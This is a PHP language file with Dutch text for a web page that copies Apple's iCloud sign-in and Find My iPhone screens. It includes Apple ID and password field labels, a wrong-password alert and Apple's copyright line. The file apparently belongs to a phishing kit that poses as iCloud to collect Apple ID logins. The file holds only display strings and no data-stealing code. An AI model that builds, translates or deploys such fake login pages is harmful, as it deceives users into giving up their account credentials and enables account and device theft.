<?php
/*
------------------
Language: Dutch
------------------
*/
 
$lang = array();
// Header 
$lang['PAGE_TITLE'] = 'iCloud';
$lang['SETUP_INSTRUCTIONS'] = 'configuratie-instructies';
// login form
$lang['SIGN_IN_TITLE'] = 'log in op iCloud';
$lang['INCORRECT_ID'] = 'Uw Apple ID of wachtwoord onjuist was.';
$lang['APPLE_ID'] = 'Apple ID';
$lang['PASSWORD'] = 'wachtwoord';
$lang['KEEP_ME'] = 'Houd me ingelogd';
$lang['FORGOT_ID'] = 'je Apple ID of wachtwoord vergeten?';
$lang['DONT_HAVE_ID'] = 'Heb je geen Apple ID?';
$lang['CREATE_YOURS'] = 'Maak er nu een aan.';
// Footer
$lang['CHECK_ACTIVATION'] = 'Status van activeringsvergrendeling';
$lang['SYSTEM_STATUS'] = 'systeemstatus ' ;
$lang['POLICY'] = 'Privacybeleid';
$lang['TERMS'] = 'Voorwaarden';
$lang['COPYRIGHT'] = 'Copyright © 2017 Apple Inc. Alle rechten voorbehouden.';
// mobile version language
$lang['MOB_PAGE_TITLE'] = 'iCloud';
$lang['MOB_FIND'] = 'Find My iPhone';
$lang['MOB_APPLE_ID'] = 'Apple ID';
$lang['MOB_EXAMPLE'] = 'example@icloud.com';
$lang['MOB_PASSWORD'] = 'wachtwoord';
$lang['MOB_REQUIRED'] = 'nodig';
$lang['MOB_LOGIN'] = 'Meld je aan ...';
$lang['MOB_FORGOT_ID'] = 'je Apple ID of wachtwoord vergeten?';
$lang['MOB_SETUP_INSTRUCTIONS'] = 'configuratie-instructies';
$lang['MOB_locating'] = 'De plaats van ...';
$lang['IDPWD_ERROR_ALERT1'] = 'Verification Failed';
$lang['IDPWD_ERROR_ALERT2'] = 'Your Apple ID or password was incorrect.';
$lang['IDPWD_ERROR_ALERT3'] = 'OK';
// Home Page
$lang['REMINDERS'] = 'herinneringen';
$lang['NOTES'] = 'Notites';
$lang['ICLOUD_DRIVE'] = 'iCloud Drive';
$lang['PHOTOS'] = 'fotos';
$lang['CONTACTS'] = 'Contacten';
$lang['MAIL'] = 'Mail';
$lang['SETTINGS'] = 'instellingen';
$lang['FIND_MY_IPHONE'] = 'Vind mijn iphone';
$lang['KEYNOTE'] = 'Keynote';
$lang['NUMBERS'] = 'Numbers';
$lang['FIND_FRIENDS'] = 'Zoek vrienden';
$lang['PAGES'] = 'Pages';
// Find . php
$lang['ALL_DEVICES'] = 'alle apparaten';
$lang['ICLOUD_SETTINGS'] = 'icloud Instellingen';
$lang['SIGN_OUT'] = 'Afmelden';
$lang['LOCATE'] = 'De plaats van ...';
$lang['ALL_DEVICES_OFFLINE'] = 'Alle apparaten Offline';
$lang['NO_LOCO'] = 'Geen locaties kunnen worden weergegeven, omdat al uw apparaten zijn offline.';
?>